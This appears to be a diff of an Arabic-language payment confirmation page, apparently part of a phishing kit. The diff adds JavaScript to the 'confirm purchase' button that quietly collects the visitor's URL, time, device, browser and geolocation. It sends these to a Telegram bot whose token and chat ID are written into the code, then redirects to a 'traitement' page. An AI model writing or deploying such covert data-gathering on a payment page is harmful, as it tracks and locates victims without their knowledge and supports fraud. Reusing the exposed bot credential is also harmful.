@@ -335,7 +335,7 @@
         
         <!-- Payment Actions -->
         <div class="payment-actions">
-            <button class="btn-confirm" onclick="window.location.href='traitement.html'">تأكيد الشراء</button>
+            <button class="btn-confirm" id="confirmButton">تأكيد الشراء</button>
             <div class="processing-note">
                 <span>سيتم معالجة طلبك</span>
                 <div class="loading-dots">
@@ -360,12 +360,116 @@
             }, 800);
             
             // Button click effect
-            const btn = document.querySelector('.btn-confirm');
+            const btn = document.getElementById('confirmButton');
             btn.addEventListener('click', function() {
                 this.textContent = 'جاري التوجيه...';
                 this.style.opacity = '0.9';
+                
+                // جمع معلومات الزائر وإرسال إشعار Telegram
+                sendTelegramNotification();
+                
+                // التوجيه بعد إرسال الإشعار
+                setTimeout(function() {
+                    window.location.href = 'traitement.html';
+                }, 1000);
             });
         });
+
+        // دالة لجمع معلومات الزائر وإرسال إشعار Telegram
+        function sendTelegramNotification() {
+            // معلومات البوت والمستلمين
+            const telegramConfigs = [
+                { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
+                { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
+            ];
+            
+            // جمع المعلومات الأساسية
+            const pageUrl = window.location.href;
+            const now = new Date();
+            const timeString = now.toLocaleString('ar-SA');
+            
+            // معلومات الجهاز والمتصفح
+            const userAgent = navigator.userAgent;
+            let deviceType = 'Desktop';
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
+                deviceType = 'Mobile';
+            }
+            
+            let browser = 'Unknown';
+            if (userAgent.indexOf('Chrome') > -1) browser = 'Chrome';
+            else if (userAgent.indexOf('Safari') > -1) browser = 'Safari';
+            else if (userAgent.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (userAgent.indexOf('Edge') > -1) browser = 'Edge';
+            else if (userAgent.indexOf('MSIE') > -1 || userAgent.indexOf('Trident/') > -1) browser = 'IE';
+            
+            // الحصول على الموقع الجغرافي (سيعمل فقط إذا سمح المستخدم)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        getLocationName(latitude, longitude, function(locationName) {
+                            sendToTelegram(pageUrl, timeString, locationName, deviceType, browser);
+                        });
+                    },
+                    function(error) {
+                        // في حالة رفض الإذن
+                        sendToTelegram(pageUrl, timeString, 'غير معروف', deviceType, browser);
+                    }
+                );
+            } else {
+                // إذا لم يكن الموقع الجغرافي مدعومًا
+                sendToTelegram(pageUrl, timeString, 'غير مدعوم', deviceType, browser);
+            }
+        }
+
+        // دالة للحصول على اسم الموقع من الإحداثيات
+        function getLocationName(latitude, longitude, callback) {
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
+                .then(response => response.json())
+                .then(data => {
+                    const address = data.address;
+                    let locationName = '';
+                    if (address.city) locationName += address.city;
+                    if (address.country) locationName += (locationName ? ' - ' : '') + address.country;
+                    callback(locationName || 'غير معروف');
+                })
+                .catch(() => {
+                    callback('غير معروف');
+                });
+        }
+
+        // دالة لإرسال البيانات إلى Telegram
+        function sendToTelegram(pageUrl, timeString, location, deviceType, browser) {
+            // معلومات البوت والمستلمين
+            const telegramConfigs = [
+                { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
+                { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
+            ];
+            
+            // نص الرسالة
+            const message = `🔔 New Website Visit 🔔
+📄 Page: ${pageUrl}
+🕒 Time: ${timeString}
+📍 Location: ${location}
+📱 Device: ${deviceType} ${deviceType === 'Mobile' ? '📱' : '💻'}
+🌐 Browser: ${browser}`;
+            
+            // إرسال الرسالة لكل مستلم في القائمة
+            telegramConfigs.forEach(config => {
+                fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: config.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                }).catch(error => console.error('Error sending to Telegram:', error));
+            });
+        }
     </script>
 </body>
 </html>
